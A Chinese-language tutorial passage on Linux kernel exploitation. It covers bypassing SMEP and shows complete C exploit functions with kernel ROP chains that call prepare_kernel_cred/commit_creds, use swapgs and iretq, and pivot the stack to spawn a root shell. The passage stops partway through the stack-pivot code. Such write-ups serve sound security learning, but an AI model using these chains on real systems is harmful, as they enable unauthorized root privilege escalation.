在Part 1部分我们关闭了所有的保护方式，包括`SMEP`、`KPTI`、`SMAP`，
本章节会逐个的开启这些保护方式，并探讨如果绕过这些机制。
#### Bypass SMEP
在Part1中，用于覆盖返回地址的函数`escalate_privs`存在userspace中，当开启SMEP时，在kernel-mode下，userspace地址被标记为`non-executable`。这一点很像userland下的`NX`保护，同样的，在userland下我们使用`ROP`，在kernelland下，有`Kernel
ROP`.
值得注意的是，`get_shell`是在由kernel-mode去换到user-mode之后完成的，因此不会受到SMEP的影响，不需要ROPchain。
##### Try To Overwrite CR4
在Part 1中提到，SMEP由CR4寄存器的20th bit控制，而在kernel-mode下，我们可以修改CR4寄存器的值，例如`mov cr4,
rax`；有一个通用的函数`native_write_cr4(value)`可以修改CR4的值为指定的value，该函数同样在kernel地址空间中
    / # cat /proc/kallsyms | grep native_write_cr4
    ffffffff814443e0 T native_write_cr4
通过`ROP`构造上述函数执行，实现修改CR4寄存器。
通过`ROPgadget --binary vmlunix > gadgets.txt`获取所有的gadget，从中找到`pop rdi, ret`。
通过调试kernel或者触发崩溃可以得到正常情况下的CR4值，20th bit对应的值是`0x100000`。
    [   10.349798] CR2: ffff88800686a200 CR3: 000000000655c000 CR4: 00000000001006f0
    >>> hex(1<<20)
    '0x100000'
当20th bit清零后，CR4值为`0x6f0`；下面的代码即可以修改CR4
    void exploit()
    {   
        unsigned long pop_rdi_ret = 0xffffffff81006370;
        unsigned long native_write_cr4 = 0xffffffff814443e0;
        unsigned long payload[0x100/8];
        unsigned long offset = 0x80/8;
        payload[offset++] = cookie;
        payload[offset++] = 0x0;
        payload[offset++] = 0x0;
        payload[offset++] = 0x0;
        payload[offset++] = (unsigned long)pop_rdi_ret;
        payload[offset++] = 0x6f0;
        payload[offset++] = (unsigned long)native_write_cr4;
        payload[offset++] = (unsigned long)escalate_privs;
        puts("[*] Prepared payload");
        size_t size = write(global_fd, payload, sizeof(payload));
        puts("[!] Should never be reached");
    }
但是实际上，失败了，kernel崩溃了，panic输出
    [*] Prepared payload
    [   19.393575] unable to execute userspace code (SMEP?) (uid: 1000)
    ...
    [   19.404200] CR2: 0000000000401102 CR3: 0000000006508000 CR4: 00000000001006f0
发现CR4的值没有改动，SMEP仍然处于`enable`状态。
##### Escalation ROPchain
既然无法改写CR4禁用SMEP，就只好通过ROP的方式完成`escalate_priv`。
  * ROP 构造 `prepare_kernel_cred(0)`
  * ROP 构造 `commit_creds()`，以上一步的返回值为参数
  * ROP 构造 `swapgs; ret`
  * ROP 构造 stack setup, `RIP|CS|RFLAGS|SP|SS`
  * ROP 构造 `iretq`
在导出的gadgets.txt搜索到下面的代码片段，可以完成前三个步骤的ROPchain
    0xffffffff81006370 : pop rdi ; ret          // 传递函数第一个参数
    0xffffffff81007616 : pop rdx ; ret          // 设置rdx
    0xffffffff81c0f8b2 : cmp rdx, -1 ; jne 0xffffffff81c0f8a7 ; ret             // rdx等于-1 不会跳转
    0xffffffff8166ff23 : mov rdi, rax ; jne 0xffffffff8166fef3 ; pop rbx ; pop rbp ; ret  // 受上述cmp rdx -1影响不会跳转
    0xffffffff8100a55f : swapgs ; pop rbp ; ret     // swapgs
但是在gadgets.txt里没有找到`iretq`指令，objdump可以发现
    $ objdump -j .text -d ./vmlinux  | grep iretq | head -3
    ffffffff8100c0d9:   48 cf                   iretq  
    ffffffff81200fc7:   48 cf                   iretq  
    ffffffff81201485:   48 cf                   iretq
构造下面的exploit函数
    void exploit_smep()
    {   
        user_rip = (unsigned long)get_root_shell;
        unsigned long prepare_kernel_cred = 0xffffffff814c67f0;
        unsigned long commit_creds = 0xffffffff814c6410;
        unsigned long pop_rdi_ret = 0xffffffff81006370;
        unsigned long pop_rdx_ret = 0xffffffff81007616;             // pop rdx ; ret
        unsigned long cmp_rdx_jne_ret = 0xffffffff81c0f8b2;         // cmp rdx, -1 ; jne 0xffffffff81c0f8a7 ; ret
        unsigned long cmp_rdx_jne_pop2_ret = 0xffffffff81964cc4;    //  cmp rdx, 8 ; jne 0xffffffff81964cb3 ; pop rbx ; pop rbp ; ret
        unsigned long mov_rdi_rax_pop2_ret = 0xffffffff8166ff23;    // mov rdi, rax ; jne 0xffffffff8166fef3 ; pop rbx ; pop rbp ; ret
        unsigned long swapgs_pop1_ret = 0xffffffff8100a55f;         // swapgs ; pop rbp ; ret
        unsigned long iretq = 0xffffffff8100c0d9;
        unsigned long payload[60];                                  // 该值太大会覆盖其他栈帧内的cookie造成stack guard终止
        unsigned long offset = 0x80/8;
        payload[offset++] = cookie;
        payload[offset++] = 0x0;
        payload[offset++] = 0x0;
        payload[offset++] = 0x0;
        payload[offset++] = (unsigned long)pop_rdi_ret;
        payload[offset++] = 0x00;
        payload[offset++] = (unsigned long)prepare_kernel_cred;
        payload[offset++] = (unsigned long)pop_rdx_ret;
        payload[offset++] = 8;
        payload[offset++] = cmp_rdx_jne_pop2_ret;
        payload[offset++] = 0;
        payload[offset++] = 0;
        payload[offset++] = mov_rdi_rax_pop2_ret;
        payload[offset++] = 0x0;
        payload[offset++] = 0x0;
        payload[offset++] = commit_creds;
        payload[offset++] = swapgs_pop1_ret;    // swapgs ; pop rbp ; ret   
        payload[offset++] = 0x0;                // 
        payload[offset++] = iretq;              // iretq        
        payload[offset++] = user_rip;
        payload[offset++] = user_cs;
        payload[offset++] = user_rflags;
        payload[offset++] = user_sp;
        payload[offset++] = user_ss;
        puts("[*] Prepared payload");
        size_t size = write(global_fd, payload, sizeof(payload));
        puts("[!] Should never be reached");
    }
##### stack pivoting
在userland的漏洞利用中，如果栈溢出长度只能够覆盖到返回地址而无法完全构造整个ROPchain时，一个有效的构造手段就是`stack
pivot`，需要修改`rsp`到可控的地址（提前布置一个fake stack）。
在userland中，并需要修改保存的`rbp`，通过`leave`类的指令间接地修改`rsp`。
在kernel-mode下，该方法实现更容易，因为有大量的gadget可以使用。最常用的就是可以直接修改`rsp/esp`的指令，只要保证值是页对齐的就合适。例如：
    0xffffffff8196f56a : mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret
由于`esp`将变为`0x5b000000`，我们可以在该地址映射可执行的page，提前写入ROPchain，溢出时只需要覆盖返回地址即可执行ROPchain。
    void stack_pivot()
    {
        user_rip = (unsigned long)get_root_shell;
        unsigned long prepare_kernel_cred = 0xffffffff814c67f0;
        unsigned long commit_creds = 0xffffffff814c6410;
        unsigned long pop_rdi_ret = 0xffffffff81006370;
        unsigned long pop_rdx_ret = 0xffffffff81007616;             // pop rdx ; ret
        unsigned long cmp_rdx_jne_ret = 0xffffffff81c0f8b2;         // cmp rdx, -1 ; jne 0xffffffff81c0f8a7 ; ret
        unsigned long cmp_rdx_jne_pop2_ret = 0xffffffff81964cc4;    //  cmp rdx, 8 ; jne 0xffffffff81964cb3 ; pop rbx ; pop rbp ; ret
        unsigned long mov_rdi_rax_pop2_ret = 0xffffffff8166ff23;    // mov rdi, rax ; jne 0xffffffff8166fef3 ; pop rbx ; pop rbp ; ret
        unsigned long swapgs_pop1_ret = 0xffffffff8100a55f;         // swapgs ; pop rbp ; ret
        unsigned long iretq = 0xffffffff8100c0d9;
        unsigned long *fake_stack = mmap((void*)(0x5b000000 - 0x1000), 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC,
                                            MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);
        unsigned offset = 0x1000 / 8;       // ROPchain in second page
        fake_stack[0] = 0xdead;             // write first page to prevent fault
        fake_stack[offset++] = 0x0;         // r12
        fake_stack[offset++] = 0x0;         // rbp
        fake_stack[offset++] = (unsigned long)pop_rdi_ret;
        fake_stack[offset++] = 0x00;
        fake_stack[offset++] = (unsigned long)prepare_kernel_cred;
        fake_stack[offset++] = (unsigned long)pop_rdx_ret;
        fake_stack[offset++] = 8;
        fake_stack[offset++] = cmp_rdx_jne_pop2_ret;
        fake_stack[offset++] = 0;
        fake_stack[offset++] = 0;
        fake_stack[offset++] = mov_rdi_rax_pop2_ret;
        fake_stack[offset++] = 0x0;
        fake_stack[offset++] = 0x0;
        fake_stack[offset++] = commit_creds;